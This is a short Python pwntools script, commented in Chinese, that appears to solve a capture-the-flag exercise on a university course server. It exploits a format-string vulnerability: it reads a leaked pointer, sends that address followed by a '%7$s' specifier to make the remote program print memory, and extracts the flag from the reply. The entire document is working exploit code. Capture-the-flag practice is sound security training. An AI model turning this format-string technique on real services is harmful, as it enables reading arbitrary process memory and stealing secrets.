from pwn import *
import struct
import re

HOST = "cs412.epfl.ch"
PORT = 9032

from pwn import *

# 连接到服务器
conn = remote(HOST, PORT)

conn.recvuntil(b'Hmmm look at this interesting pointer: ')
flag_ptr = int(conn.recvline().strip(), 16)
log.info(f"Flag pointer address: {hex(flag_ptr)}")

# 构造payload
# 使用 %n$s 直接引用参数
# 假设 flag 指针地址是第 7 个参数
payload = p32(flag_ptr) + b'%7$s'

# 发送payload
conn.sendlineafter(b'Input your magical spell! ', payload)

# 接收输出
output = conn.recvuntil(b'\nHope you got what you wanted!\n')
log.info(f"Output: {output}")

# 提取flag内容
# flag内容在%s读取的位置
flag = output.split(p32(flag_ptr))[1].split(b'\n')[0]
log.success(f"Flag: {flag.decode()}")

# 关闭连接
conn.close()